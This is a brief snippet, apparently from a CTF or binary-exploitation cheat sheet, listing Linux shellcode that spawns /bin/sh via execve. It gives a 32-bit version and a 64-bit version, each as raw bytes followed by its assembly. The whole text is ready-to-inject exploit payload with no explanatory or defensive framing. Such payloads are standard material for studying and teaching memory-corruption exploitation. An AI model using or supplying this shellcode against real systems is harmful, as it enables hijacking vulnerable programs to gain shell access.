### 32位

```
b'j\x0bXSh//shh/bin\x89\xe3\xcd\x80'
```

```
push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
```

### 64位

```
b'H1\xf6VH\xbf/bin//shWT_\xb0;\x99\x0f\x05'
```

```
xor 	rsi,	rsi			
push	rsi				
mov 	rdi,	0x68732f2f6e69622f	 
push	rdi
push	rsp		
pop	rdi				
mov 	al,	59			
cdq					
syscall
```